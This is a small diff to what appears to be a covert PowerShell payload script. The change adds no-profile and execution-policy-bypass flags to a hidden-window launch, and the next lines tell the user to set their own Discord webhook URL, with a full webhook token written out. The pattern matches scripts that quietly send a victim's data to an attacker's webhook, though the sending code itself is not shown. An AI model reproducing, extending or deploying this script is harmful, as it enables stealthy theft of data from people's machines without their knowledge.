@@ -1,4 +1,4 @@
-PowerShell.exe -WindowStyle hidden {
+PowerShell.exe -WindowStyle hidden -NoP -Ep Bypass {
 
 #CHANGE URL TO YOUR URL
   $url="https://discord.com/api/webhooks/1258951712375570523/ZzVRGI8GumQjTSz_s2geTSXNsk0tE9zp5_56xGu9u2GEHwjLmXhsYPL4G4GMYGmjOC3f" ;
